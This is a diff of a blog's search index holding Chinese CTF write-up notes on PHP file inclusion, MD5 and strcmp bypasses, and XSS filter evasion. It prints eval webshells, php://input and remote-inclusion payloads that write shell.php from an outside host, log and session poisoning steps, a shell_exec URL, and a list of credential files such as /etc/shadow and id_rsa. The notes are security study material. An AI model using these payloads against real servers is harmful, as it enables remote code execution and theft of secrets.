@@ -1,11 +1,22 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Bugku]]></title>
+    <url>%2F2018%2F12%2F21%2FBugku%2F</url>
+    <content type="text"><![CDATA[Bugku补题 备份是个好习惯题目不难涉及到的php函数比较多，都是现查的，记一下开始备份提示，查看临时文件index.php~或者index.php.bakindex.php.bak中有源码 strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串。如果是，则该函数返回str2在str1中首次出现的地址；否则，返回NULL。&lt;?php echo strstr(“Helloworld!”,”world”);?&gt;输出：world! $_SERVER[‘REQUEST_URI’]http://localhost(域名或者ip地址)/aaa/index.php?p=222&amp;q=333结果：$_SERVER[‘QUERY_STRING’]=”p=222&amp;q=333”;$_SERVER[‘REQUEST_URI’]=”/aaa/index.php?p=222&amp;q=333”;$_SERVER[‘SCRIPT_NAME’]=”/aaa/index.php”;$_SERVER[‘PHP_SELF’]=”/aaa/index.php”; 由实例可知：$_SERVER[“QUERY_STRING”] 获取查询 语句，实例中可知，获取的是?后面的值$_SERVER[“REQUEST_URI”] 获取 http://localhost 后面的值，包括/$_SERVER[“SCRIPT_NAME”] 获取当前脚本的路径，如：index.php$ _SERVER[“PHP_SELF”] 当前正在执行脚本的文件名 substr(string,start,length)substr() 函数返回字符串的一部分。length不必需。echo substr(“Hello world”,6);输出第六个字符之后的输出：world str_replace(find,replace,string,count)find必需。规定要查找的值。replace必需。规定替换 find 中的值的值。string必需。规定被搜索的字符串。count可选。一个变量，对替换数进行计数。 echo str_replace(“world”,”John”,”Hello world!”); 将world替换为John输出：Hello John!该函数对大小写敏感。请使用 str_ireplace() 执行对大小写不敏感的搜索。 parse_str() 函数把查询字符串解析到变量中。parse_str(“name=Peter&amp;age=43”);echo $name;echo $age;输出：Peter 43 MD5碰撞题目代码的意思就是ip地址之后从？开始的值，然后变为第一位之后的值，删掉?。由echo语句可知变量中有key1和key2，但是$str中遇到key就替换为空，由于替换只执行一次，所以双写就可以绕过，之后MD5碰撞构造payload：http://123.206.87.240:8002/web16/?kekeyy1[]=1&amp;kekeyy2[]=2，就可以拿到flag。 flag在index里文件包含漏洞1.使用PHP封装协议PHP带有很多内置的URL风格的封装协议，，这类协议与fopen(),copy(),file_exists(),filesize()等文件系统函数所提供的功能类似。 file:// 访问本地文件系统http:// 访问HTTP(s)网址php:// 访问输入/输出流zlib:// 压缩流data:// 数据ssh2:// Secure Shell 2expect:// 处理交互式的流 glob:// 查找匹配的文件路径 使用封装协议读取PHP文件 使用PHP封装协议内置封装协议可以读取PHP文件。 (1)http://www.xxser.com/index.php?page=php://filter/read=convert.base64-encode/resource=xxxx.php 得到base64加密的php源码 (2)写入php文件 使用php://input执行php语句，但使用这条语句时需要注意: php://input受限于allow_url_include(on)。 构造URL: http://www.xxser.com/index.php?page=php://input, 并且提交数据为: &lt;?php system (‘net user’);?&gt; 如果提交&lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval($_POST[‘xxser’]);?&gt;”)?&gt;将会在index.php所在目录下生成shell.php 2.包含截断当文件名会被强制添加时使用%00截断，php中不会显示%00后面的内容，这种方法只适用于magic_quotes_gpc=Off时，开启时%00会被转义。 3. 远程包含Shell如果目标主机的allow_url_fopen是激活的，就可以尝试远程包含一句话木马，如: http://www.2cto.com/echo.txt 代码如下: &lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval ($_POST[x]);?&gt;”)?&gt;访问: http://www.xxser.com/Index.php?page=http://www.2cto.com/echo.txt, 将会在Index.php所在的目录下生成shell.php 4.本地包含配合文件上传很多网站通常会提供文件上传的功能，比如:上传头像、文档等。假设已经上传一句话图片木马到服务器，路径为: /uploadfile/201363.jpg 图片代码如下: &lt;?fputs(fopen(“shell.php”,”w”),”&lt;?php eval($_POST[x]);?&gt;”)?&gt;访问URL: http://www.xxser.com/Index.php?page=./uploadfile/201363.jpg, 包含这张图片，将会在Index.php所在的目录中生成shell.php 5.包含日志文件Apache运行后一般默认生成两个日志文件，一个是access.log和error.log，Apache访问日志文件记录了客户端的每次请求及服务器响应的相关信息，例如，当我们请求Index.php时，Apache就会记录我们的操作，并且写到访问日志文件access.log中 当访问一个不存在的资源时，Apache日志同样会记录 这就意味着，如果网站存在本地包含漏洞，却没有可以包含的文件时，就可以去访问URL: http://www.xxser.com/&lt;?php phpinfo();?&gt;.Apache会记录请求”&lt;?php phpinfo();?&gt;” 并写到accsee.log文件中，这时再去包含Apache的日志文件，就可以利用包含漏洞。 但实际是不可行的，因为在访问URL后一句话木马在日志文件里变形了 127.0.0.1 - - [04/Jun/2013:15:04:22 +0800] “GET /%3C?php%20phpinfo();)?%3E HTTP/1.1” 403 291 PHP代码中的”&lt;,&gt;,空格”都被浏览器转码了，这样就无法利用Apache包含漏洞。 但可以通过Burp绕过编码 再利用accsee去包含accsee.log，即可成功执行其中的PHP代码 在使用Apache日志文件包含时，首先需要确定Apache的日志路径，否则即使攻击者将PHP写入日志文件，也无法包含常见几个路径：/var/log/apache/access_log/var/www/logs/access_log/var/log/access_log 原文链接：https://blog.csdn.net/qq_41007744/article/ 6.包含session文件session中的内容可以被控制，传入恶意代码。session的存储位置可以获取。 通过phpinfo的信息可以获取到session的存储位置。 通过猜测默认的session存放位置进行尝试。session 文件一般存放在 / tmp/、/var/lib/php/session/、/var/lib/php/session / 等目录下，文件名字一般以 sess_SESSIONID 来保存php一句话木马查看php的shell信息：&lt;?php phpinfo();exit;?&gt;eval函数将接受的字符串当做代码执行：&lt;?php eval($_get[‘a’]);?&gt;&lt;?php @eval($_POST[‘c’]);?&gt; NCTF Web题‘基本操作’复现登陆界面，guest弱口令进入，通过数据库查询语句在session中写入一句话木马“select &lt;?php eval($_get[‘a’]);?&gt;” 留下查询记录。burp抓包得到sessionid为 p5skdakeoussr62f91bg2oo2cv3is54i，包含session文件，一句话木马会将获取到的GET型a变量的值存入到session中。再构造index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_p5skdakeoussr62f91bg2oo2cv3is54i&amp;a=echo%20shell_exec(%22ls%20/%22) 列出当前目录所以文件看到nctfffffffff，cat就能拿到flag。]]></content>
+      <categories>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[实验吧题库]]></title>
     <url>%2F2018%2F12%2F10%2F%E5%AE%9E%E9%AA%8C%E5%90%A7%E9%A2%98%E5%BA%93%2F</url>
-    <content type="text"><![CDATA[MD5 碰撞当 md5接受的数据为数组时就会返回null，两值相等。]]></content>
+    <content type="text"><![CDATA[MD5 碰撞当 md5接受的数据为数组时就会返回null，两值相等。 strcmpstrcmp(str1,str2)如果str1小于str2返回-1，str1=str2返回0，str1&gt;str2返回1，if(！strcmp($a,$b)),要求a与b中值相等。strcmp()在比较字符串和数组的时候直接返回0a[]=1&amp;b[]=1]]></content>
       <categories>
-        <category>wp</category>
+        <category>WP</category>
       </categories>
       <tags>
         <tag>Web</tag>
@@ -17,17 +28,6 @@
     <content type="text"><![CDATA[XSS (Reflected)用phpstudy搭了一个渗透测试环境，从xss开始吧，难度从低到高的源码low难度没有任何过滤直接 alert(‘xss’)就可以得到弹窗，medium难度加了str_replace，high难度加了preg_replace，这两个函数有什么区别呢？搜索一波， str_replace（）：定义和用法 str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。 该函数必须遵循下列规则： 如果搜索的字符串是数组，那么它将返回数组。如果搜索的字符串是数组，那么它将对数组中的每个元素进行查找和替换。如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换如果查找的是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用。注释：该函数区分大小写。请使用 str_ireplace() 函数执行不区分大小写的搜索。 (1)大小写绕过&lt; sCript&gt;(2)双写绕过&lt; scr&lt; script&gt;ipt&gt;（原文：https://blog.csdn.net/caoyouming0609/article/details/75208002） preg_replace（）：.： 匹配除“\n”之外的任何单个字符。*： 匹配前面的子表达式零次或多次。所以&lt; script&gt;标签不可用，&lt; img src=”javascript:alert(‘xss’);”&gt;也不可用，我们无法依靠属性值进行跨站，但可以产生自己的事件&lt; img src=”1” onerror=alert(‘xss’)&gt; onerror是IMG标记的一个事件，只要页面发生错误，该事件立即被激活，语句中浏览器解释IMG标记时，会加载src属性引用的图片地址，该图片不存在则触发onerror事件。 盗取cookie(咕~)]]></content>
       <categories>
         <category>基础</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[文件包含漏洞]]></title>
-    <url>%2F2018%2F11%2F29%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
-    <content type="text"><![CDATA[文件包含漏洞（NCTF Web题‘基本操作’）又是一次毫无游戏体验的ctf，留下没技术的泪水，还是乖乖复现补题吧。 本地文件包含（恶意代码执行或者敏感信息泄露）探查路径遍历漏洞漏洞产生的原因是因为攻击者可以将路径遍历序列放入文件名内，从指定的文件目录向上回溯，从而访问服务器上的文件。路径遍历序列叫做“../” 1.包含目录文件?targent=test.txt如果里面的内容是php，则内容会被当成php执行,不是php则会读取到文件内容(用来读取/etc/passw等等配置文件的敏感信息) ?targent=./../../test.txt./当前目录,../上一级目录,这样的遍历目录来读取文件Linux：/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_ras.keystore/root/.ssh/known_hosts/etc/passwd/etc/shadow/etc/my.cnf/etc/httpd/conf/httpd.conf/root/.bash_history/root/.mysql_history/proc/self/fd/fd[0-9]*(文件标识符)/proc/mounts/porc/config.gz 2.包含日志文件无法上传文件的时候,可以尝试利用UA插入payload到日志文件,然后包含容器的日志文件(错误、访问文件都行),注意：选择凌晨包含最好,payload后面加一个exit()退出程序,以防大日志导致浏览器卡死,如果包含不成功,也许是open_basedir限制了目录常见几个路径：/var/log/apache/access_log/var/www/logs/access_log/var/log/access_log 3.包含session文件session中的内容可以被控制，传入恶意代码。session的存储位置可以获取。 通过phpinfo的信息可以获取到session的存储位置。 通过猜测默认的session存放位置进行尝试。session 文件一般存放在 / tmp/、/var/lib/php/session/、/var/lib/php/session / 等目录下，文件名字一般以 sess_SESSIONID 来保存本题复现登陆界面，guest弱口令进入，通过数据库查询语句在session中写入一句话木马“select &lt;?php eval($_get[‘a’]);?&gt;” 留下查询记录。burp抓包得到sessionid为 p5skdakeoussr62f91bg2oo2cv3is54i，包含session文件，一句话木马会将获取到的GET型a变量的值存入到session中。再构造index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_p5skdakeoussr62f91bg2oo2cv3is54i&amp;a=echo%20shell_exec(%22ls%20/%22) 列出当前目录所以文件看到nctfffffffff，cat就能拿到flag。php一句话木马查看php的shell信息：&lt;?php phpinfo();exit;?&gt;eval函数将接受的字符串当做代码执行：&lt;?php eval($_get[‘a’]);?&gt;&lt;?php @eval($_POST[‘c’]);?&gt;]]></content>
-      <categories>
-        <category>Web</category>
       </categories>
       <tags>
         <tag>Web</tag>
